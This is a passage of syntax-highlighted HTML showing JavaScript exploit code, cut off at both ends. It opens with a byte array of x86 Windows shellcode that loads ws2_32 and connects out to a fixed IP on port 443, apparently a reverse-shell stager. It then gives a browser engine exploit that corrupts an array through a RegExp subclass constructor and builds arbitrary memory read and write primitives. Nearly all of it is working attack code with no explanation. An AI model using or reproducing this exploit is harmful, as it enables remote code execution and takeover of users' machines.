number">0x72</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0x3c</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x7c</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x2c</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0xc1</span><span class="token punctuation">,</span><span class="token number">0xcf</span><span class="token punctuation">,</span><span class="token number">0x0d</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xc7</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0xef</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0x3c</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd3</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x3c</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x34</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd6</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0xc1</span><span class="token punctuation">,</span><span class="token number">0xcf</span><span class="token punctuation">,</span><span class="token number">0x0d</span><span class="token punctuation">,</span><span class="token number">0xac</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xc7</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0x03</span><span class="token punctuation">,</span><span class="token number">0x7d</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token number">0x3b</span><span class="token punctuation">,</span><span class="token number">0x7d</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd3</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x0c</span><span class="token punctuation">,</span><span class="token number">0x4b</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x1c</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd3</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0x5b</span><span class="token punctuation">,</span><span class="token number">0x5b</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">,</span><span class="token number">0xe9</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x5d</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x33</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x73</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x4c</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token number">0x07</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd0</span><span class="token punctuation">,</span><span class="token number">0xb8</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0xc4</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x6b</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">,</span><span class="token number">0x5a</span><span class="token punctuation">,</span><span class="token number">0x7c</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xbb</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xe6</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0xea</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0xdf</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x97</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x99</span><span class="token punctuation">,</span><span class="token number">0xa5</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x0a</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x4e</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0xec</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0xd9</span><span class="token punctuation">,</span><span class="token number">0xc8</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0xa4</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0xe5</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x93</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0xd9</span><span class="token punctuation">,</span><span class="token number">0xc8</span><span class="token punctuation">,</span><span class="token number">0x5f</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x7d</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x0b</span><span class="token punctuation">,</span><span class="token number">0x2f</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0x6e</span><span class="token punctuation">,</span><span class="token number">0x4d</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span><span class="token number">0x5e</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x0c</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xe9</span><span class="token punctuation">,</span><span class="token number">0x9b</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xc3</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0xc6</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0xc1</span><span class="token punctuation">,</span><span class="token number">0xc3</span><span class="token punctuation">,</span><span class="token number">0xbb</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">0xb5</span><span class="token punctuation">,</span><span class="token number">0xa2</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x6a</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token number">0xd5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> not_optimised_out <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">var</span> target_function <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> <span class="token number">0xdecaf0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        not_optimised_out <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    not_optimised_out <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>    not_optimised_out <span class="token operator">|=</span> <span class="token number">0xff</span><span class="token punctuation">;</span>    not_optimised_out <span class="token operator">*=</span> <span class="token number">12</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x10000</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">target_function</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> g_array<span class="token punctuation">;</span><span class="token keyword">var</span> tDerivedNCount <span class="token operator">=</span> <span class="token number">17</span> <span class="token operator">*</span> <span class="token number">87481</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">;</span><span class="token keyword">var</span> tDerivedNDepth <span class="token operator">=</span> <span class="token number">19</span> <span class="token operator">*</span> <span class="token number">19</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token parameter">flag</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    g_array <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    g_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1dbabe</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">'c01db33f'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">gc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0x10000</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">oobAccess</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> this_ <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>buffer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>buffer_view <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>page_buffer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>page_view <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>prevent_opt <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> kSlotOffset <span class="token operator">=</span> <span class="token number">0x1f</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> kBackingStoreOffset <span class="token operator">=</span> <span class="token number">0xf</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">LeakArrayBuffer</span> <span class="token keyword">extends</span> <span class="token class-name">ArrayBuffer</span> <span class="token punctuation">&#123;</span>        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>slot <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>page_buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LeakArrayBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>page_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>page_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token function-variable function">toString</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token string">'a'</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cb</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">DerivedBase</span> <span class="token keyword">extends</span> <span class="token class-name">RegExp</span> <span class="token punctuation">&#123;</span>        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// var array = null;</span>            <span class="token keyword">super</span><span class="token punctuation">(</span>                <span class="token comment">// at this point, the 4-byte allocation for the JSRegExp `this` object</span>                <span class="token comment">// has just happened.</span>                <span class="token punctuation">&#123;</span>                    toString<span class="token operator">:</span> cb                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'g'</span>                <span class="token comment">// now the runtime JSRegExp constructor is called, corrupting the</span>                <span class="token comment">// JSArray.</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// this allocation will now directly follow the FixedArray allocation</span>            <span class="token comment">// made for `this.data`, which is where `array.elements` points to.</span>            this_<span class="token punctuation">.</span>buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            g_array<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> this_<span class="token punctuation">.</span>page_buffer<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// try&#123;</span>    <span class="token keyword">var</span> derived_n <span class="token operator">=</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">(function derived_n(i) &#123;        if (i == 0) &#123;            return DerivedBase;        &#125;        class DerivedN extends derived_n(i-1) &#123;            constructor() &#123;                super();                return;                </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token string">"this.a=0;"</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span>tDerivedNCount<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">            &#125;        &#125;        return DerivedN;    &#125;)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">new</span> <span class="token punctuation">(</span><span class="token function">derived_n</span><span class="token punctuation">(</span>tDerivedNDepth<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>buffer_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">leakPtr</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>page_buffer<span class="token punctuation">.</span>slot <span class="token operator">=</span> obj<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>buffer_view<span class="token punctuation">.</span><span class="token function">getUint32</span><span class="token punctuation">(</span>kSlotOffset<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>prevent_opt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">setPtr</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>buffer_view<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span>kBackingStoreOffset<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>prevent_opt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">read32</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setPtr</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>page_view<span class="token punctuation">.</span><span class="token function">getUint32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>prevent_opt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">write32</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setPtr</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>page_view<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>prevent_opt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">write8</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setPtr</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>page_view<span class="token punctuation">.</span><span class="token function">setUint8</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> 